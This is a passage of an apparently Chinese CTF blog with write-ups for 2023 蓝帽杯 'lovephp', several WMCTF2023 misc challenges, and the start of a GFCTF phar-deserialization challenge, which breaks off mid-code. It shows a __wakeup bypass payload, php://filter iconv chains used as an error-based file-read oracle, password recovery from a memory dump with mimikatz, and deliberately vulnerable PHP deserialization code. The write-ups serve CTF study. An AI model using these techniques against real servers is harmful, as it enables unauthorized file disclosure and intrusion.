id="2023蓝帽杯lovephp"><a href="#2023蓝帽杯lovephp" class="headerlink" title="2023蓝帽杯lovephp"></a>2023蓝帽杯lovephp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Saferman</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span> = True;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;check === True)&#123;<br>            <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;check=False;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;my_secret.flag&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;my_secret.flag&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>三处考点</p><p>参数名中的<code>[  </code> <code>. </code> <code>空格 </code> <code> +</code>都会被转化为下划线，但若先出现<code>[</code>后面的<code>.</code> 则不会转化</p><p>php7.4高版本绕过<code>__wakeup</code>魔术方法，使用<code>C:8:&quot;Saferman&quot;:0:&#123;&#125;</code>，C只能执行construct()函数或者destruct()函数，所以就被绕过了</p><p>file()函数是把文件内容放入数组</p><p>这里使用侧信道盲注，使用上一题的脚本，修改为get请求，带上参数即可</p><h2 id="对脚本内容的理解-链接放在最后）"><a href="#对脚本内容的理解-链接放在最后）" class="headerlink" title="对脚本内容的理解(链接放在最后）"></a>对脚本内容的理解(链接放在最后）</h2><h3 id="这部分讲的是脚本原理，可以不看"><a href="#这部分讲的是脚本原理，可以不看" class="headerlink" title="这部分讲的是脚本原理，可以不看"></a>这部分讲的是脚本原理，可以不看</h3><p>我们把侧信道的关键点称为oracle</p><h4 id="Part1-报错"><a href="#Part1-报错" class="headerlink" title="Part1 - 报错"></a>Part1 - 报错</h4><p>想到报错，我们一般是见到页面报错，而此处我们用到的是服务端报错即返回50xHTTP的状态码</p><p>如何找到服务端的oracle呢，脚本作者的方案是使用 <code>php filter</code> 配合 <code>convert.iconv.L1.UCS-4LE</code> 编码，经过多次该编码，达到某一程度就会使php产生内存错误</p><p><img src="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/image-20230830185630646.png" alt="image-20230830185630646"></p><p>产生错误之后，我们想能不能找到一种带判断的编码，并且经过判断后能够使产生报错的代码不再报错，通过这样盲注获取信息</p><p>脚本作者在<a href="https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724">php filter dechunk</a> 部分发现，其对于字符的处理存在一个范围限制，只检查第一个字符是否在<code>a-fA-f0-9</code> 这个范围内，若是则输出空，若不是则输出原字符串</p><p><img src="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/image-20230830191100214.png" alt="image-20230830191100214"></p><p>因此我们可以对字符串的第一个字符进行判断</p><p>这里给出参考文章的作者给出的案例，蓝色框和红色框对比是为了测出产生内存错误的临界情况（不同机器对于php产生内存错误的长度不同），红色框和绿色框对比用来判断第一个字符是否在范围内</p><p>但此处我有点疑惑，明明第一个字符是<code>U</code>（多加一次编码我测试的首字符是不变的）为什么能够通过检查，输出空字符串   （希望能够解答一下）</p><p><img src="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/image-20230830191805947.png" alt="image-20230830191805947"></p><h3 id="Part2-交换字符"><a href="#Part2-交换字符" class="headerlink" title="Part2-交换字符"></a>Part2-交换字符</h3><p>由于dechunk只能对第一个字符做判断，于是想能不能找到交换字符顺序的编码形式</p><p>下面我们用<code>abcdefgh</code>八字节举例</p><p>使用 <code>convert.iconv.CSUNICODE.UCS-2BE</code> 我们可以前后交换每两个字节的位置，我们称这个编码规则为 <code>r2</code> </p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">php</span> &gt; <span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh&quot;</span>));</span><br><span class="hljs-function"><span class="hljs-title">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;badcfehg&quot;</span></span><br></code></pre></td></tr></table></figure><p>使用 <code>convert.iconv.UCS-4LE.10646-1:1993</code> 我们可以将每四个字节的位置逆序，我们称这个编码规则为 <code>r4</code> </p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">php</span> &gt; <span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;</span>));</span><br><span class="hljs-function"><span class="hljs-title">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;dcbahgfe&quot;</span></span><br></code></pre></td></tr></table></figure><p>第三位想要放到第一个，先经过r2，再经过一次r4即可</p><p>于是前半段我们都可以进行判断，但后半段我们没法利用r2和r4提到前面去</p><p>这里需要利用php在处理base64字符串会忽略非法字符。令字符串前面出现非法字符，然后利用交换规则，执行base64-decode，非法字符就被删除，后面字符就换到了前面去</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">##参考文章作者给出的例子<br><br><span class="hljs-comment">// 产生填充字符</span><br>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdef&quot;</span>)</span>);<br><span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;��abcdef&quot;</span><br><br><span class="hljs-comment">// 使用 r4 进行移位</span><br>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;</span>)</span>);<br><span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;ba��fedc&quot;</span><br><br><span class="hljs-comment">// 使用 base64 去掉冗余位</span><br>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdef&quot;</span>)</span>);<br><span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;bafedQ==&quot;</span><br><br><span class="hljs-comment">// 再次使用 r4 交换位置</span><br>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;</span>)</span>);<br><span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;efab==Qd&quot;</span><br></code></pre></td></tr></table></figure><p>文章的作者提出了他的细节，这里并没有使用 <code>abcdefgh</code> 8 字节为例，这是因为 <code>r4</code> 编码对于字节有要求，一定需要 4 字节为一组，而我们再产生 2 字节冗余之后会引起 <code>r4</code> 报错，使得 <code>r4</code> 编码失效，所以这里为了方便举例就没有使用 8 字节。</p><p>虽然是为了方便，但这也是需要解决的问题</p><h3 id="Part2-1-两个等号的处理"><a href="#Part2-1-两个等号的处理" class="headerlink" title="Part2.1 - 两个等号的处理"></a>Part2.1 - 两个等号的处理</h3><p>使用该filt将两个等号转换成24字节的字符串（至于为什么去看参考文章吧）</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">php &gt; var_dump(file_get_contents(&quot;php://filter/<span class="hljs-built_in">convert</span>.quoted-printable-encode|<span class="hljs-built_in">convert</span>.quoted-printable-encode|<span class="hljs-built_in">convert</span>.iconv.L1.utf7|<span class="hljs-built_in">convert</span>.iconv.L1.utf7|<span class="hljs-built_in">convert</span>.iconv.L1.utf7|<span class="hljs-built_in">convert</span>.iconv.L1.utf7/resource=data:,==&quot;));<br>string(<span class="hljs-number">24</span>) &quot;+---AD0-<span class="hljs-number">3</span>D3D+---AD0-<span class="hljs-number">3</span>D3D&quot;<br></code></pre></td></tr></table></figure><p>算了，写不下去了（没有自己的理解，反正也是跟着文章作者走的），看完也不是很懂，还是看别人的优质文章吧</p><p><a href="https://tttang.com/archive/1755/">The End of AFR? - 跳跳糖 (tttang.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2023</title>
    <link href="/2023/08/24/WMCTF2023/"/>
    <url>/2023/08/24/WMCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="WMCTF2023（复现）"><a href="#WMCTF2023（复现）" class="headerlink" title="WMCTF2023（复现）"></a>WMCTF2023（复现）</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">WMCTF&#123;Welcome_W&amp;MCTF_2023!&#125;<br></code></pre></td></tr></table></figure><h3 id="Fantastic-terminal"><a href="#Fantastic-terminal" class="headerlink" title="Fantastic terminal"></a>Fantastic terminal</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">cat challenge<br><br><span class="hljs-comment">#WMCTF&#123;fanta3t1c_term1nal_1n_the_c0nta1ner_1n_the_br0w3er&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fantastic-terminal-Rev"><a href="#Fantastic-terminal-Rev" class="headerlink" title="Fantastic terminal Rev"></a>Fantastic terminal Rev</h3><p>把程序base64 dump下来分析</p><p><img src="/2023/08/24/WMCTF2023/image-20230824113839462.png" alt="image-20230824113839462"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">c = <span class="hljs-string">&#x27;&#x27;&#x27;6120291406111F57</span><br><span class="hljs-string">37260D37353C3724</span><br><span class="hljs-string">330D3E333C633F20</span><br><span class="hljs-string">3127340D20372634</span><br><span class="hljs-string">3333220D353C6339</span><br><span class="hljs-string">3A3A3A3A3A3A3126</span><br><span class="hljs-string">2F3A3A3A3A3A3A3A&#x27;&#x27;&#x27;</span><br><br>c = c.split(<span class="hljs-string">&#x27;\\n&#x27;</span>)<br>c = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c]<br>e = []<br>flag =<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    d = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(i)//<span class="hljs-number">2</span>):<br>        d.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i[j*<span class="hljs-number">2</span>:j*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)^<span class="hljs-number">0x52</span>))<br>    d.reverse()<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> d:<br>        flag+=j<br>    <span class="hljs-comment"># e.append(d)</span><br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#WMCTF&#123;r3venge_term1nal_after_fuck1ng_paatchhhhhhhhhhhhh&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Oversharing"><a href="#Oversharing" class="headerlink" title="Oversharing"></a>Oversharing</h3><p>导出SMB对象，保存dmp文件，使用minikatz分析获取ssh连接的密码</p><p><img src="/2023/08/24/WMCTF2023/image-20230824114110135.png" alt="image-20230824114110135"></p><p>看到ssh的password，<code>ssh randark@题目环境 -p 端口</code></p><p><img src="/2023/08/24/WMCTF2023/640.png" alt="图片"></p><p>然后获取flag</p><h3 id="find-me"><a href="#find-me" class="headerlink" title="find me"></a>find me</h3><p>题目描述前往<code>Reddit</code>寻找<code>WearyMeadow</code></p><p><img src="/2023/08/24/WMCTF2023/image-20230824114436116.png" alt="image-20230824114436116"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">aHR0cHM6Ly91ZmlsZS5pby82NzB1bnN6cA</span>==<br><br><span class="hljs-comment">#https://ufile.io/670unszp    (流量包下载链接)</span><br></code></pre></td></tr></table></figure><p>用户有个<code>my blog</code>连接，</p><p><img src="/2023/08/24/WMCTF2023/image-20230824114825505.png" alt="image-20230824114825505"></p><p>文章打开需要密码</p><p><code>WearyMeadow</code>在<code>Rebbit</code>的头像为<code>github</code>的初始头像，于是到<a href="github.com">github.com</a>上搜索该用户</p><p><img src="/2023/08/24/WMCTF2023/image-20230824115253229.png" alt="image-20230824115253229"></p><p>发现两个自动登录脚本，打开后发现密码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">usernameStr</span> = <span class="hljs-string">&#x27;WearyMeadow&#x27;</span><br><span class="hljs-attr">passwordStr</span> = <span class="hljs-string">&#x27;P@sSW0rD123$%^&#x27;</span><br></code></pre></td></tr></table></figure><p>尝试用密码打开文章，成功解密，得到了server.py与client.py</p><p>分析逻辑写出decrypt函数的代码，（缺少key和数据）</p><p>wireshark分析流量包</p><p><img src="/2023/08/24/WMCTF2023/640-16928495892856.png" alt="图片"></p><p><img src="/2023/08/24/WMCTF2023/640-16928495954419.png" alt="图片"></p><p><img src="/2023/08/24/WMCTF2023/640-169284960612612.png" alt="图片"></p><p>说明<code>key</code>为<code>mysecretkey</code>，然后将该数据转化为原始数据</p><p><img src="/2023/08/24/WMCTF2023/640-169284963012315.png" alt="图片"></p><p>最长的一串应该还有flag信息</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs css"><br>import socket<br>import random<br><span class="hljs-selector-tag">from</span> Crypto<span class="hljs-selector-class">.Cipher</span> import AES<br><span class="hljs-selector-tag">from</span> sys import argv<br>import binascii<br><br>def pad(s):<br>    return s + b<span class="hljs-string">&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)<br><br>def <span class="hljs-built_in">encrypt</span>(message, key):<br>    seed = random.<span class="hljs-built_in">randint</span>(<span class="hljs-number">0</span>, <span class="hljs-number">11451</span>)<br>    random.<span class="hljs-built_in">seed</span>(seed)<br>    encrypted = b<span class="hljs-string">&#x27;&#x27;</span><br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(message)):<br>        encrypted += <span class="hljs-built_in">bytes</span>([message[i] ^ random.<span class="hljs-built_in">randint</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>    cipher = AES.<span class="hljs-built_in">new</span>(key, AES.MODE_ECB)<br>    encrypted = cipher.<span class="hljs-built_in">encrypt</span>(<span class="hljs-built_in">pad</span>(encrypted))<br>    return encrypted<br><br><br>key = b<span class="hljs-string">&#x27;mysecretkey&#x27;</span>.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">16</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(key)<br>hex_ciphertext = <span class="hljs-string">&quot;778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2&quot;</span><br><br>ciphertext = binascii.<span class="hljs-built_in">unhexlify</span>(hex_ciphertext)<br>cipher = AES.<span class="hljs-built_in">new</span>(key, AES.MODE_ECB)<br>decrypted_data = cipher.<span class="hljs-built_in">decrypt</span>(ciphertext)<br><span class="hljs-built_in">print</span>(decrypted_data)<br><br>unpadded = decrypted_data.<span class="hljs-built_in">rstrip</span>(b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(unpadded)<br><span class="hljs-built_in">print</span>()<br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">11451</span>):          #爆破种子<br>    seed = i<br>    random.<span class="hljs-built_in">seed</span>(seed)<br>    original_message = b<span class="hljs-string">&#x27;&#x27;</span><br>    for j in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(unpadded)):<br>        original_message += <span class="hljs-built_in">bytes</span>([unpadded[j] ^ random.<span class="hljs-built_in">randint</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>    # <span class="hljs-built_in">print</span>(original_message)<br>    if b<span class="hljs-string">&#x27;WMCTF&#x27;</span> in original_message:<br>        <span class="hljs-built_in">print</span>(original_message)<br>        <br>#b<span class="hljs-string">&#x27;well, here you are: WMCTF&#123;OH_Y0u_f1nd_Me__(@_@)&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化</title>
    <link href="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h2 id="GFCTF–文件查看器"><a href="#GFCTF–文件查看器" class="headerlink" title="GFCTF–文件查看器"></a>GFCTF–文件查看器</h2><p>本题目可在<a href="https://www.ctfer.vip/">NSSCTF</a>平台复现</p><p>目录扫描发现<code>www.zip</code></p><p><code>User.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;view/login.html&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>                <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>())&#123;<br>                    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location:./?c=Files&amp;m=read&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;username&#125;</span>的密码不正确或不存在该用户&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            (@<span class="hljs-variable language_">$this</span>-&gt;password)();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123; <br>            (<span class="hljs-variable">$name</span>)();<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p><code>Myerror.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;error_log&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/log/error.txt&#x27;</span>);<br>            <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;log_errors&#x27;</span>,<span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;test&#125;;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>Files.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>();<br>        &#125;<br>        <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;view/file.html&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请输入文件名&quot;</span>);<br>            &#125;<br>            <span class="hljs-variable">$contents</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFile</span>();<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&lt;textarea class=&quot;file_content&quot; type=&quot;text&quot; value=&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$contents</span>;<br>        &#125;<br>        